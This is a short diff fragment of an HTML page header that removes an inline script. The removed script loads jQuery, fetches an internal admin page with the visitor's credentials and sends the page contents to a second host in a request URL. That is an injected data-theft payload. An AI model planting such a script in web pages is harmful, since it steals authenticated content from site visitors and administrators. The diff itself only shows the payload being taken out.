@@ -22,14 +22,4 @@
       </div>
     </div>
   </div>
-  <script src="http://libs.baidu.com/jquery/1.7.2/jquery.min.js"></script>
-  <script charset="utf-8">
-         htmlobj = $.ajax({
-                        url: "http://192.168.43.146:8080/admin", 
-                        async: false,
-                        xhrFields: {
-                            withCredentials: true
-                        }});
-         $.ajax({url: "http://127.0.0.1:9000/"+htmlobj.responseText, async: false});
-    </script>
 </header>
